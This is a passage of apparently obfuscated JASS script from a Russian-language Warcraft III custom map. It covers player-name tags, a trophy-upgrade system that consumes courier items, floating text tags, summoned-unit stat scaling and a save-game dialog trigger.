if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
elseif OE[Ma]=="LTz.V" then
set PQ="|c00fd88f5[Зайка]|r "+"|c00fd88f5"+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
elseif OE[Ma]=="as.36rus" then
set PQ="|c00000000[Жнец]|r "+OD[Ma]+OE[Ma]
set PR[Ma]=PQ
if GetUnitAbilityLevel(Hu,$41303944)>=1 then
call SetPlayerName(Player(Ma),PQ)
endif
endif
endfunction
function nY takes unit Hu,integer Pc,integer Pd,integer Pe,integer Pf,integer Pg,integer Ph returns nothing
local player Ht=GetOwningPlayer(Hu)
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,"|c00008000Трофей улучшен!")
call RemoveItem(nP(Hu,Pc))
call RemoveItem(nP(Hu,Pd))
call RemoveItem(nP(Hu,Pe))
call RemoveItem(nP(Hu,Pf))
call RemoveItem(nP(Hu,Pg))
call RemoveItem(nP(Hu,Ph))
endfunction
function nZ takes unit Hu returns nothing
local player Ht=GetOwningPlayer(Hu)
local unit PK=NL[2+2*GetPlayerId(Ht)]
local integer PJ=GetUnitAbilityLevel(Hu,$41313247)+GetUnitAbilityLevel(Hu,$41314335)+GetUnitAbilityLevel(Hu,$41313234)+GetUnitAbilityLevel(Hu,$41313357)+GetUnitAbilityLevel(Hu,$41314341)+GetUnitAbilityLevel(Hu,$41314330)+GetUnitAbilityLevel(Hu,$41314332)
if PJ==1 then
if nO(PK,$49304157) and nO(PK,$49304230) and nO(PK,$49304231) and nO(PK,$4930415A) and nO(PK,$49304159) and nO(PK,$49304158) then
call nX(Hu,0,2,true)
call nY(PK,$49304157,$49304230,$49304231,$4930415A,$49304159,$49304158)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[1])
endif
elseif PJ==2 then
if nO(PK,$49303334) and nO(PK,$49303335) and nO(PK,$49303336) and nO(PK,$49305345) and nO(PK,$49304441) then
call nX(Hu,0,3,true)
call nY(PK,$49303334,$49303335,$49303336,$49305345,$49304441,0)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[2])
endif
elseif PJ==3 then
if nO(PK,$49305133) and nO(PK,$4930474F) and nO(PK,$49304751) and nO(PK,$49304750) and nO(PK,$49304752) then
call nX(Hu,0,4,true)
call nY(PK,$49305133,$4930474F,$49304751,$49304750,$49304752,0)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[3])
endif
elseif PJ==4 then
if nO(PK,$6C676468) and nO(PK,$6F646566) and nO(PK,$6576746C) and nO(PK,$70727674) and nO(PK,$72616731) and nO(PK,$62737064) then
call nY(PK,$6F646566,$6C676468,$6576746C,$70727674,$72616731,$62737064)
call nX(Hu,0,5,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[4])
endif
elseif PJ==5 then
if nO(PK,$49303345) and nO(PK,$49303344) and nO(PK,$49303343) and nO(PK,$49305349) and nO(PK,$49305256) then
call nY(PK,$49303345,$49303344,$49303343,$49305349,$49305256,0)
call nX(Hu,0,6,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[5])
endif
elseif PJ==6 then
if nO(PK,$49305437) and nO(PK,$4930534A) and nO(PK,$4930534C) then
call nY(PK,$49305437,$4930534A,$4930534C,0,0,0)
call nX(Hu,0,7,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[6])
endif
elseif PJ==7 then
if nO(PK,$49304234) and nO(PK,$49304233) and nO(PK,$49304232) and nO(PK,$49304235) and nO(PK,$49304237) and nO(PK,$49304236) then
call nY(PK,$49304234,$49304233,$49304236,$49304237,$49304232,$49304235)
call nX(Hu,0,8,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[7])
endif
elseif PJ==8 then
if nO(PK,$4930334C) and nO(PK,$4930334B) and nO(PK,$4930334D) and nO(PK,$4930534B) and nO(PK,$49305257) then
call nY(PK,$4930334C,$4930334B,$4930334D,$4930534B,$49305257,0)
call nX(Hu,0,9,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[8])
endif
elseif PJ==9 then
if nO(PK,$49303354) and nO(PK,$49303352) and nO(PK,$49303353) and nO(PK,$49303456) and nO(PK,$49305258) then
call nY(PK,$49303354,$49303352,$49303353,$49303456,$49305258,0)
call nX(Hu,0,10,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[9])
endif
elseif PJ==10 then
if nO(PK,$49303159) and nO(PK,$4930384A) and nO(PK,$49303157) and nO(PK,$49303843) and nO(PK,$49303230) then
call nY(PK,$49303159,$4930384A,$49303157,$49303843,$49303230,0)
call nX(Hu,0,11,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[10])
endif
elseif PJ==11 then
if nO(PK,$72617466) and nO(PK,$49303543) and nO(PK,$49303545) and nO(PK,$49303544) and nO(PK,$49303546) and nO(PK,$49303542) then
call nY(PK,$72617466,$49303543,$49303545,$49303544,$49303546,$49303542)
call nX(Hu,0,12,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[11])
endif
elseif PJ==12 then
if nO(PK,$49304244) and nO(PK,$49304245) and nO(PK,$49304248) and nO(PK,$49304246) and nO(PK,$49304247) and nO(PK,$49304249) then
call nY(PK,$49304245,$49304244,$49304248,$49304246,$49304247,$49304249)
call nX(Hu,0,13,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[12])
endif
elseif PJ==13 then
if nO(PK,$49313038) and nO(PK,$676F7072) then
call nY(PK,$49313038,$676F7072,0,0,0,0)
call nX(Hu,0,14,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[13])
endif
elseif PJ==14 then
if nO(PK,$736F7266) and nO(PK,$49303944) and nO(PK,$49303943) and nO(PK,$49303946) and nO(PK,$49303945) and nO(PK,$49303947) then
call nY(PK,$736F7266,$49303944,$49303947,$49303945,$49303946,$49303943)
call nX(Hu,0,15,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[14])
endif
elseif PJ==15 then
if nO(PK,$6B336D33) and nO(PK,$4930424C) and nO(PK,$4930424B) and nO(PK,$4930424A) then
call nY(PK,$6B336D33,$4930424C,$4930424B,$4930424A,0,0)
call nX(Hu,0,16,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[15])
endif
elseif PJ==16 then
if nO(PK,$6B796768) and nO(PK,$49304658) and nO(PK,$49304657) and nO(PK,$49304656) then
call nY(PK,$6B796768,$49304658,$49304657,$49304656,0,0)
call nX(Hu,0,17,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[16])
endif
elseif PJ==17 then
if nO(PK,$64746862) and nO(PK,$49304546) and nO(PK,$49304547) and nO(PK,$49304545) then
call nY(PK,$64746862,$49304546,$49304547,$49304545,0,0)
call nX(Hu,0,18,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[17])
endif
elseif PJ==18 then
if nO(PK,$49304855) and nO(PK,$49304852) and nO(PK,$49304851) and nO(PK,$72617433) and nO(PK,$49304930) then
call nY(PK,$49304855,$49304852,$49304851,$72617433,$49304930,0)
call nX(Hu,0,19,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[18])
endif
elseif PJ==19 then
if nO(PK,$74666172) and nO(PK,$736B7274) and nO(PK,$74626172) then
call nY(PK,$74666172,$736B7274,$74626172,0,0,0)
call nX(Hu,0,20,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[19])
endif
elseif PJ==20 then
if nO(PK,$49305351) and nO(PK,$49305350) and nO(PK,$49305352) then
call nY(PK,$49305351,$49305350,$49305352,0,0,0)
call nX(Hu,0,21,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[20])
endif
elseif PJ==21 then
if nO(PK,$72756D70) and nO(PK,$73747265) and nO(PK,$4930594C) then
call nY(PK,$72756D70,$73747265,$4930594C,0,0,0)
call nX(Hu,0,22,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[21])
endif
elseif PJ==22 then
if nO(PK,$72616D34) and nO(PK,$6C757265) and nO(PK,$73666F67) and nO(PK,$4930594D) then
call nY(PK,$72616D34,$6C757265,$73666F67,$4930594D,0,0)
call nX(Hu,0,23,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[22])
endif
elseif PJ==23 then
if nO(PK,$73686377) and nO(PK,$70686C74) and nO(PK,$6D6E7366) and nO(PK,$61786173) then
call nY(PK,$73686377,$70686C74,$6D6E7366,$61786173,0,0)
call nX(Hu,0,24,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[23])
endif
elseif PJ==24 then
if nO(PK,$49305543) and nO(PK,$49305545) and nO(PK,$49305544) and nO(PK,$49305453) then
call nY(PK,$49305543,$49305545,$49305544,$49305453,0,0)
call nX(Hu,0,25,true)
else
call nV(Ht)
call DisplayTextToPlayer(Ht,.5,0,Pi[24])
endif
endif
set PK=null
endfunction
function na takes nothing returns nothing
local unit Hu=GetBuyingUnit()
local item MO=GetSoldItem()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local integer PJ=GetUnitAbilityLevel(MT[Ma],$41313247)+GetUnitAbilityLevel(MT[Ma],$41314335)+GetUnitAbilityLevel(MT[Ma],$41313234)+GetUnitAbilityLevel(MT[Ma],$41313357)+GetUnitAbilityLevel(MT[Ma],$41314341)+GetUnitAbilityLevel(MT[Ma],$41314330)+GetUnitAbilityLevel(MT[Ma],$41314332)
if GetItemTypeId(MO)==$49313048 then
call nZ(MT[Ma])
elseif GetItemTypeId(MO)==$49313046 and PJ==0 then
call nX(Hu,$41313357,1,true)
elseif GetItemTypeId(MO)==$49313041 and PJ==0 then
call nX(Hu,$41314330,1,true)
elseif GetItemTypeId(MO)==$49313047 and PJ==0 then
call nX(Hu,$41314332,1,true)
elseif GetItemTypeId(MO)==$49313044 and PJ==0 then
call nX(Hu,$41314341,1,true)
elseif GetItemTypeId(MO)==$49313043 and PJ==0 then
call nX(Hu,$41313234,1,true)
elseif GetItemTypeId(MO)==$49313042 and PJ==0 then
call nX(Hu,$41313247,1,true)
elseif GetItemTypeId(MO)==$49313045 and PJ==0 then
call nX(Hu,$41314335,1,true)
endif
set MO=null
set Hu=null
endfunction
function nb takes nothing returns nothing
set PI=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(PI,EVENT_PLAYER_UNIT_SELL_ITEM)
call TriggerAddAction(PI,function na)
set Pi[1]="|c000080FFДля улучшения трофея требуется|r:\n        -Ядовитая кольчуга\n        -Том из прошлого\n        -Рукавица Великих\n        -Ярость\n        -Дыхание огня\n        -Дыхание льда\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[2]="|c000080FFДля улучшения трофея требуется|r:\n        -Ботинки\n        -Броня природы\n        -Посох Фауны\n        -Топаз\n        -Эссенция леса\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[3]="|c000080FFДля улучшения трофея требуется|r:\n        -Новогодняя шапка\n        -Паразит\n        -Зловещий щит\n        -Порча\n        -Клык вампира\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[4]="|c000080FFДля улучшения трофея требуется|r:\n        -Сфера огня\n        -Дикий червь\n        -Талисман защиты\n        -Талисман здоровья\n        -Хрустальный шар\n        -Шлем доблести\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[5]="|c000080FFДля улучшения трофея требуется|r:\n        -Обувь чародея\n        -Рунный топор\n        -Прзрачные когти\n        -Опал\n        -Осколок Льда\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[6]="|c000080FFДля улучшения трофея требуется|r:\n        -Часть корабля\n        -Кубик(опал)\n        -Кровавая диадема(изумруд)\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[7]="|c000080FFДля улучшения трофея требуется|r:\n        -Власть порчи\n        -Власть тьмы\n        -Похищение жизни\n        -Похищение маны\n        -Темная сила\n        -Чумная энергия\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[8]="|c000080FFДля улучшения трофея требуется|r:\n        -Кольчуга темного пламени\n        -Каратель\n        -Посох дракона\n        -Изумруд\n        -Эссенция тьмы\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[9]="|c000080FFДля улучшения трофея требуется|r:\n        -Шиповник\n        -Рыцарский нагрудник\n        -Режущий плоть\n        -Эмеральд\n        -Эссенция Темного Всадника\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[10]="|c000080FFДля улучшения трофея требуется|r:\n        -Зеленый череп\n        -Красный череп\n        -Темный череп\n        -Пурпурный череп\n        -Синий череп\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[11]="|c000080FFДля улучшения трофея требуется|r:\n        -Блокирующий Смерть\n        -Обувь повиновения\n        -Броня Кая\n        -Головной убор Наг\n        -Ожерелье медузы\n        -Эссенция пучины\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[12]="|c000080FFДля улучшения трофея требуется|r:\n        -Меткость\n        -Копье лунного света\n        -Накидка эльфов\n        -Череп покойника\n        -Посох смертника\n        -Эликсир выносливости\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[13]="|c000080FFДля улучшения трофея требуется|r:\n        -Ход конём\n        -Эссенция моря\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[14]="|c000080FFДля улучшения трофея требуется|r:\n        -Золотой\n        -Посох тёмных\n        -Черепки\n        -Шлем повелителя\n        -Элемент разбойника\n        -Эссенция земли\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[15]="|c000080FFДля улучшения трофея требуется|r:\n        -Книга Силы\n        -Книга Ловкости\n        -Книга разума\n        -Эссенция камня\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[16]="|c000080FFДля улучшения трофея требуется|r:\n        -Карта сокровищ\n        -Руна лихорадки\n        -Ящик золота\n        -Сломанная коса\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[17]="|c000080FFДля улучшения трофея требуется|r:\n        -Феникс\n        -Только во снах\n        -Душевная боль\n        -Эссенция крабообразного\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[18]="|c000080FFДля улучшения трофея требуется|r:\n        -Броня Мрази\n        -Гнилая туша\n        -Яркость(3)\n        -Полет мысли(3)\n        -Вспышка ярости(3)\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[19]="|c000080FFДля улучшения трофея требуется|r:\n        -Темный Гримуар\n        -Сюрикен\n        -Звездопад\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[20]="|c000080FFДля улучшения трофея требуется|r:\n        -Сущность воина(п.о)\n        -Сущность вора(п.о)\n        -Сущность мага(п.о)\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[21]="|c000080FFДля улучшения трофея требуется|r:\n        -Оберег возмездия\n        -Рассекатель\n        -Яблоко с улыбкой\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[22]="|c000080FFДля улучшения трофея требуется|r:\n        -Проклятый вихрь\n        -Сфера покаяния\n        -Якорь\n        -Магический оберег(Э.С)\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[23]="|c000080FFДля улучшения трофея требуется|r:\n        -курьер Маркиз\n        -курьер Кай\n        -Спи, мой хороший, спи\n        -Проклятый оберег(Э.С)\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
set Pi[24]="|c000080FFДля улучшения трофея требуется|r:\n        -Эссенция песка\n        -Ядовитая руна Силы\n        -Ядовитая руна Ловкости\n        -Ядовитая руна Разума\n        |c00008000Положите эти предметы в курьера и попытайтесь снова|r."
endfunction
function nc takes nothing returns nothing
local unit Nv=GetEnumUnit()
local location Ht=GetUnitLoc(Nv)
local unit NQ=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call nD(NQ,1)
call UnitAddAbility(NQ,Vt)
call SetUnitAbilityLevel(NQ,Vt,Vv)
call IssueTargetOrder(NQ,Vu,Nv)
call RemoveLocation(Ht)
set NQ=null
set Nv=null
set Ht=null
endfunction
function nd takes group Na,integer M6,integer Vr,string Vs returns nothing
set Vt=M6
set Vu=Vs
set Vv=Vr
call ForGroup(Na,function nc)
endfunction
function ne takes unit Hu,string M6,real NT,integer NU,integer NV,integer NW returns nothing
local texttag NX=CreateTextTag()
call SetTextTagText(NX,M6,NT)
call SetTextTagPosUnit(NX,Hu,50)
call SetTextTagColor(NX,NU,NV,NW,255)
call SetTextTagVelocity(NX,0,.03)
call SetTextTagVisibility(NX,GetLocalPlayer()==GetOwningPlayer(Hu))
call SetTextTagFadepoint(NX,1)
call SetTextTagLifespan(NX,2)
call SetTextTagPermanent(NX,false)
call SetTextTagSuspended(NX,false)
endfunction
function nf takes unit Hu,unit Nv,string M6 returns nothing
local texttag NX=CreateTextTag()
call SetTextTagText(NX,"+"+M6,.023)
call SetTextTagPosUnit(NX,Hu,50)
call SetTextTagColor(NX,0,255,0,255)
call SetTextTagVelocity(NX,0,.03)
call SetTextTagVisibility(NX,GetLocalPlayer()==GetOwningPlayer(Nv))
call SetTextTagFadepoint(NX,1)
call SetTextTagLifespan(NX,2)
call SetTextTagPermanent(NX,false)
call SetTextTagSuspended(NX,false)
endfunction
function ng takes unit NQ,unit Hu,string M6,real NT,integer NU,integer NV,integer NW,real Nr returns nothing
local texttag NX=CreateTextTag()
call SetTextTagText(NX,M6,NT)
call SetTextTagPosUnit(NX,NQ,Nr)
call SetTextTagColor(NX,NU,NV,NW,255)
call SetTextTagVelocity(NX,0,.03)
call SetTextTagVisibility(NX,GetLocalPlayer()==GetOwningPlayer(Hu))
call SetTextTagFadepoint(NX,1)
call SetTextTagLifespan(NX,2)
call SetTextTagPermanent(NX,false)
call SetTextTagSuspended(NX,false)
endfunction
function nh takes unit Hu,string M6,real NT,integer NU,integer NV,integer NW returns nothing
local texttag NX=CreateTextTag()
call SetTextTagText(NX,M6,NT)
call SetTextTagPosUnit(NX,Hu,50)
call SetTextTagColor(NX,NU,NV,NW,255)
call SetTextTagVelocity(NX,0,.03)
call SetTextTagFadepoint(NX,1)
call SetTextTagLifespan(NX,2)
call SetTextTagPermanent(NX,false)
call SetTextTagSuspended(NX,false)
endfunction
function ni takes unit Hu,real M6,real Ne,real NT,real hB,real Nm,integer Ht,string hN,integer Mg,integer hO,integer L9 returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))+1
set Ng[Ma]=Ng[Ma]+M6
set UG[Ma]=UG[Ma]+R2I(M6*100)
set Nf[Ma]=Nf[Ma]+Ne
set UK[Ma]=UK[Ma]+R2I(Ne*100)
set Nd[Ma]=Nd[Ma]+NT
set UH[Ma]=UH[Ma]+R2I(NT*100)
set N0[Ma]=N0[Ma]+hB
set UI[Ma]=UI[Ma]+R2I(hB*100)
set TQ[Ma]=TQ[Ma]+Nm
set UJ[Ma]=UJ[Ma]+R2I(Nm*100)
set UM[Ma]=UM[Ma]+Ht
set hP[Ma]=hN
call SetHeroStr(MT[Ma-1],GetHeroStr(MT[Ma-1],false)+Mg,false)
call SetHeroAgi(MT[Ma-1],GetHeroAgi(MT[Ma-1],false)+hO,false)
call SetHeroInt(MT[Ma-1],GetHeroInt(MT[Ma-1],false)+L9,false)
call UnitAddAbility(MT[Ma-1],$41304648)
endfunction
function nj takes unit Hu,integer L9 returns nothing
local integer UX=10000*GetUnitAbilityLevel(Hu,$41304456)+1000*GetUnitAbilityLevel(Hu,$4131394B)+100*GetUnitAbilityLevel(Hu,$4131394A)+10*GetUnitAbilityLevel(Hu,$41313949)+GetUnitAbilityLevel(Hu,$41305545)
local integer UV=UX+L9
call UnitRemoveAbility(Hu,$4131394B)
call UnitRemoveAbility(Hu,$4131394A)
call UnitRemoveAbility(Hu,$41313949)
call UnitRemoveAbility(Hu,$41305545)
call UnitRemoveAbility(Hu,$41304456)
call UnitRemoveAbility(Hu,$4131424F)
loop
if UV>=10000 then
call UnitAddAbility(Hu,$41304456)
call SetUnitAbilityLevel(Hu,$41304456,UV/10000)
set UV=UV-10000*GetUnitAbilityLevel(Hu,$41304456)
else
if UV>=1000 then
call UnitAddAbility(Hu,$4131394B)
call SetUnitAbilityLevel(Hu,$4131394B,UV/1000)
set UV=UV-1000*GetUnitAbilityLevel(Hu,$4131394B)
else
if UV>=100 then
call UnitAddAbility(Hu,$4131394A)
call SetUnitAbilityLevel(Hu,$4131394A,UV/100)
set UV=UV-100*GetUnitAbilityLevel(Hu,$4131394A)
else
if UV>=10 then
call UnitAddAbility(Hu,$41313949)
call SetUnitAbilityLevel(Hu,$41313949,UV/10)
set UV=UV-10*GetUnitAbilityLevel(Hu,$41313949)
else
if UV>=1 then
call UnitAddAbility(Hu,$41305545)
call SetUnitAbilityLevel(Hu,$41305545,UV/1)
set UV=UV-1*GetUnitAbilityLevel(Hu,$41305545)
endif
endif
endif
endif
endif
exitwhen UV==0
endloop
endfunction
function nk takes unit US,integer UU returns nothing
loop
if UU>=10000 then
call UnitAddAbility(US,$4131394C)
call SetUnitAbilityLevel(US,$4131394C,6)
call UnitRemoveAbility(US,$4131394C)
set UU=UU-10000
else
if UU>=1000 then
call UnitAddAbility(US,$4131394C)
call SetUnitAbilityLevel(US,$4131394C,5)
call UnitRemoveAbility(US,$4131394C)
set UU=UU-1000
else
if UU>=100 then
call UnitAddAbility(US,$4131394C)
call SetUnitAbilityLevel(US,$4131394C,4)
call UnitRemoveAbility(US,$4131394C)
set UU=UU-100
else
if UU>=10 then
call UnitAddAbility(US,$4131394C)
call SetUnitAbilityLevel(US,$4131394C,3)
call UnitRemoveAbility(US,$4131394C)
set UU=UU-10
else
if UU>=1 then
call UnitAddAbility(US,$4131394C)
call SetUnitAbilityLevel(US,$4131394C,2)
call UnitRemoveAbility(US,$4131394C)
set UU=UU-1
endif
endif
endif
endif
endif
exitwhen UU==0
endloop
endfunction
function nl takes unit Hu,integer L9 returns nothing
local integer UY=1000*GetUnitAbilityLevel(Hu,$4131345A)+100*GetUnitAbilityLevel(Hu,$4131394F)+10*GetUnitAbilityLevel(Hu,$4131394E)+GetUnitAbilityLevel(Hu,$4131394D)
local integer UW=UY+L9
call UnitRemoveAbility(Hu,$4131345A)
call UnitRemoveAbility(Hu,$4131394F)
call UnitRemoveAbility(Hu,$4131394E)
call UnitRemoveAbility(Hu,$4131394D)
loop
if UW>=1000 then
call UnitAddAbility(Hu,$4131345A)
call SetUnitAbilityLevel(Hu,$4131345A,UW/1000)
set UW=UW-1000*GetUnitAbilityLevel(Hu,$4131345A)
else
if UW>=100 then
call UnitAddAbility(Hu,$4131394F)
call SetUnitAbilityLevel(Hu,$4131394F,UW/100)
set UW=UW-100*GetUnitAbilityLevel(Hu,$4131394F)
else
if UW>=10 then
call UnitAddAbility(Hu,$4131394E)
call SetUnitAbilityLevel(Hu,$4131394E,UW/10)
set UW=UW-10*GetUnitAbilityLevel(Hu,$4131394E)
else
if UW>=1 then
call UnitAddAbility(Hu,$4131394D)
call SetUnitAbilityLevel(Hu,$4131394D,UW/1)
set UW=UW-1*GetUnitAbilityLevel(Hu,$4131394D)
endif
endif
endif
endif
exitwhen UW==0
endloop
endfunction
function nm takes nothing returns nothing
call DialogDisplay(GetLocalPlayer(),Pm,false)
endfunction
function nn takes nothing returns boolean
local boolean Pl=false
if Pl==false then
call DialogDisplay(GetLocalPlayer(),Pm,true)
endif
call TimerStart(Pn,0.,false,function nm)
return false
endfunction
function no takes nothing returns nothing
local timer Hc
local trigger Pk
call DoNotSaveReplay()
set Hc=CreateTimer()
set Pj=GetHandleId(Hc)
if Pj!=$1034A6 then
endif
set Pk=CreateTrigger()
call TriggerRegisterGameEvent(Pk,EVENT_GAME_SAVE)
call TriggerAddCondition(Pk,Filter(function nn))
set Pk=null
set Hc=null
endfunction
function np takes nothing returns nothing
local unit US=GetSummonedUnit()
local unit UT=GetSummoningUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(UT))
local integer UU
local real UX
local integer UV
local real UY
local integer UW
if GetUnitTypeId(US)==$6E303652 then
set UU=R2I(GetUnitState(UT,UNIT_STATE_MAX_LIFE)/2)+R2I(GetUnitState(UT,UNIT_STATE_LIFE)/2)*UM[Ma+1]/100
set UY=I2R(GetHeroInt(UT,true)/10+20*GetUnitAbilityLevel(UT,$4130584C))
set UX=I2R(GetHeroInt(UT,true)+500*GetUnitAbilityLevel(UT,$4130584C))
set UV=R2I(UX+UX*UM[Ma+1]/100)
set UW=R2I(UY+UY*UM[Ma+1]/100)
call nk(US,UU)
call nj(US,UV)
call nl(US,UW)
elseif GetUnitTypeId(US)==$68303348 then
set UV=GetUnitAbilityLevel(UT,$41304644)*200+(GetHeroInt(UT,true)+GetHeroStr(UT,true)+GetHeroAgi(UT,true))/2
call nj(US,UV)
endif
set US=null
set UT=null
endfunction
function nq takes nothing returns nothing
local unit US=GetSummonedUnit()
local unit UT=GetSummoningUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(UT))
local integer UU
local real UX
local integer UV
local real UY
local integer UW
local integer Mc
if GetUnitTypeId(US)==$6E30344F then
set UU=R2I(GetUnitState(MT[Ma],UNIT_STATE_MAX_LIFE))
set UV=GetHeroStr(MT[Ma],true)*3/2
set UW=GetHeroStr(MT[Ma],true)/10
call nk(US,UU)
call nj(US,UV)
call nl(US,UW)
elseif GetUnitTypeId(US)==$6E303448 then
set UU=R2I(GetUnitState(MT[Ma],UNIT_STATE_MAX_LIFE)/2)
set UV=GetHeroStr(MT[Ma],true)
set UW=GetHeroStr(MT[Ma],true)/20
call nk(US,UU)
call nj(US,UV)
call nl(US,UW)
elseif GetUnitTypeId(US)==$6E303855 then
set UU=R2I(GetUnitState(MT[Ma],UNIT_STATE_MAX_LIFE))
set UV=GetHeroStr(MT[Ma],true)*2
set UW=GetHeroStr(MT[Ma],true)/7
call nk(US,UU)
call nj(US,UV)
call nl(US,UW)
elseif GetUnitTypeId(US)==$6E616472 then
set UU=R2I(GetUnitState(MT[Ma],UNIT_STATE_MAX_LIFE)*1.5)
set UV=GetHeroStr(MT[Ma],true)*3
set UW=GetHeroStr(MT[Ma],true)/5
call nk(US,UU)
call nj(US,UV)
call nl(US,UW)
elseif GetUnitTypeId(US)==$6E303653 then
set UU=R2I(GetUnitState(UT,UNIT_STATE_MAX_LIFE))+R2I(GetUnitState(UT,UNIT_STATE_LIFE)/1)*UM[Ma+1]/100
set UY=I2R(GetHeroInt(UT,true)/10+150)
set UX=I2R(GetHeroInt(UT,true)*3/2+2500)
set UV=R2I(UX+UX*UM[Ma+1]/100)
set UW=R2I(UY+UY*UM[Ma+1]/100)
call nk(US,UU)
call nj(US,UV)
call nl(US,UW)
elseif GetUnitTypeId(US)==$6E30364A then
call RemoveUnit(UZ[Ma+100])
set UU=R2I(GetUnitState(UT,UNIT_STATE_MAX_LIFE)/5)+R2I(GetUnitState(UT,UNIT_STATE_LIFE)/5)*UM[Ma+1]/100
if GetUnitAbilityLevel(UT,$41303047)>=1 then
set UX=I2R(100*GetUnitAbilityLevel(UT,$41303047)+GetHeroStr(UT,true))
call SetUnitAbilityLevel(US,$4130504C,GetUnitAbilityLevel(UT,$41303047))
else
set UX=I2R(1300+GetHeroStr(UT,true)*3/2)
call SetUnitAbilityLevel(US,$4130504C,11)
call SetUnitAbilityLevel(US,$41305651,2)
endif
set UV=R2I(UX+UX*UM[Ma+1]/100)
call nj(US,UV)
call nk(US,UU)
set UZ[Ma+100]=US
elseif GetUnitTypeId(US)==$6E303033 then
set Mc=R2I(GetUnitState(UT,UNIT_STATE_MAX_LIFE)/3)*GetUnitAbilityLevel(UT,$41303046)
set UU=Mc+Mc*UM[Ma+1]/100
set UY=I2R(GetHeroStr(UT,true)/20*GetUnitAbilityLevel(UT,$41303046))
set UW=R2I(UY)+R2I(UY)*UM[Ma+1]/100
call nk(US,UU)
call nl(US,UW)
call UnitAddAbility(US,$41304F4B)
call UnitAddAbility(US,$41313647)
call GroupAddUnit(To,US)
elseif GetUnitTypeId(US)==$68303542 then
set UU=R2I(GetUnitState(UT,UNIT_STATE_MAX_LIFE)/4)
set UX=I2R(GetHeroInt(UT,true)/20*GetUnitAbilityLevel(UT,$41313337))
set UV=R2I(UX+UX*UM[Ma+1]/100)
call nk(US,UU)
call nj(US,UV)
if GetUnitTypeId(UT)==$4830364E then
call SetUnitVertexColor(US,255,70,120,255)
call AddSpecialEffectTarget("war3mapImported\\PurpleSphere.mdx",US,"chest")
endif
elseif GetUnitTypeId(US)==$68303533 then
set UX=I2R(GetHeroInt(UT,true)/10*GetUnitAbilityLevel(UT,$41313133))
set UV=R2I(UX+UX*UM[Ma+1]/100)
call nj(US,UV)
endif
set US=null
set UT=null
endfunction
function nr takes nothing returns nothing
local trigger UR=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(UR,EVENT_PLAYER_UNIT_SUMMON)
call TriggerAddAction(UR,function nq)
call TriggerAddAction(UR,function np)
set UR=null
endfunction
function ns takes nothing returns boolean
if not (GetOwningPlayer(GetAttacker())==Player(11)) then
return false
endif
return true
endfunction
function nt takes nothing returns boolean
return IsUnitInGroup(GetFilterUnit(),To)==true
endfunction
function nu takes nothing returns boolean
return IsUnitInGroup(GetFilterUnit(),Tp)==true
endfunction
